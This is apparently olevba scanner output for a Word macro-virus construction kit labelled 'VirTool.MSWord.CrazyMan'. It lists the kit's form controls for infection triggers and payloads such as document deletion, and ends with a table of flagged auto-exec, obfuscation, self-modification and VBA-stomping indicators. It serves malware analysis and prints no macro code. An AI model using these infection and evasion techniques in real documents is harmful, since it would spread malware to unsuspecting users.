- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page_Main'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page_Infect'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page_PayLoad'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page_Info'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'InfoLabel'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_Lizenz'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'InfoImage'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_keine_Auswahl'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame6'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_keine_Auswahl'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AutoNew'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AutoOpen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AutoClose'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_DocumentOpen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_DocumentClose'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_DocumentNew'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_Main_InfectInfo'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_Sub_InfectInfo'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ImageOK'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ImageNO'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame5'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextBox'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_HyperLink'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextTauschen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_TextBox'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_HyperLink'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_TextTauschen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AkivDocDel'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextBox_Option'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_HyperLink_Optionen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextTauschen_Optionen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextBox_Hilfe'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_HyperLink_Hilfe'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Button_TextTauschen_Hilfe'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AkivDocDel_Optionen'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Check_AkivDocDel_Hilfe'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_AkivDocDel'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label_Info'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image_Info'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton2_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |OptionButton1_Change|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

